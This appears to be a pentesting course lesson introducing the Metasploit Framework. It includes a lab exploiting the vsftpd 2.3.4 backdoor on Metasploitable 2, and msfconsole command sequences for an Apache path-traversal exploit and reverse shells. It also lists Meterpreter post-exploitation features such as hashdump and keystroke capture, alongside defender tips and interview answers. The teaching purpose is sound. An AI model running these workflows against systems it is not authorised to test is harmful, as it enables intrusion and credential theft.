Intro to Metasploit Framework

Metasploit is the most widely used exploitation framework in the world.

THEORY

Metasploit architecture: msfconsole (CLI), modules (exploit, payload, auxiliary, post, encoder), database (stores results, creds, loot). Exploit delivers the attack. Payload defines post-exploitation behavior. Auxiliary does scanning/enum. Post does privesc/extraction.

msfconsole search type:exploit platform:linux apache 2.4.49 use exploit/multi/http/apache_normalize_path show options set RHOSTS 10.10.10.1 set LHOST 10.10.10.50 check # Verify target vulnerable exploit # Run the exploit

Payloads: Staged (small stager + larger payload, stealthy) vs Inline (single payload, reliable). Meterpreter: in-memory post-exploitation agent supporting sysinfo, hashdump, screenshot, keylogging.

Key insight: Metasploit is a pentesting framework, not a hacking tool. Always run check before exploit. Running exploits without understanding them is dangerous.
// attacker vs defender mindset
ATTACKER
  • Search methodically: search type:exploit platform:linux cve:2021. Filter by type, platform, CVE year.
  • Always run check before exploit. Verifies target is vulnerable without launching destructive attack.
  • Use Meterpreter: sysinfo, getuid, hashdump, screenshot, keyscan_start. Runs in memory (no disk writes).
  • Set up multi/handler for receiving shells from exploits run outside msfconsole.
DEFENDER
  • Keep Metasploit updated -- defenders use it too. msfupdate regularly.
  • Monitor for Meterpreter traffic: reverse HTTPS on unusual ports, staged payload connections, beaconing.
  • Use Windows Defender ASR rules to block common Metasploit behaviors like LSASS dumping.
  • Run Metasploit's auxiliary/scanner/* modules against your own network.

HANDS-ON LAB

Goal: Launch msfconsole: sudo msfconsole -q. Wait for DB connection....

  1. Launch msfconsole: sudo msfconsole -q. Wait for DB connection.
  2. Search vsftpd: search vsftpd 2.3.4. Note module path.
  3. Use exploit: use exploit/unix/ftp/vsftpd_234_backdoor. Show options.
  4. Set RHOSTS to Metasploitable 2 IP, LHOST to your IP.
  5. Run check, then exploit. You should get a shell.
  6. In shell: id; whoami; uname -a. Background with 'background'. Sessions: sessions -l.
Deliverable: Screenshot of successful exploit showing shell access with search-configure-exploit workflow documented.

INTERVIEW READY
Q: "Walk me through Metasploit exploitation."
A: "Launch msfconsole, search for exploit (search vsftpd 2.3.4), select with use, configure RHOSTS/LHOST, run check to verify vulnerable, then exploit. If successful, interact via Meterpreter for post-exploit or drop to shell. Always check before exploit to avoid crashes."
Q: "Staged vs inline payloads?"
A: "Staged (windows/meterpreter/reverse_tcp): small stager downloads larger payload. Smaller, stealthier, needs connect-back. Inline (windows/shell_reverse_tcp): entire payload in one package. More reliable but larger. Staged for size restrictions; inline for unstable connections."
Q: "What is Meterpreter?"
A: "Metasploit's in-memory payload (no disk writes, harder to detect). Capabilities: sysinfo, getuid, hashdump, screenshot, keyscan, shell, upload/download, getsystem (privesc). Encrypted channels, loadable extensions."
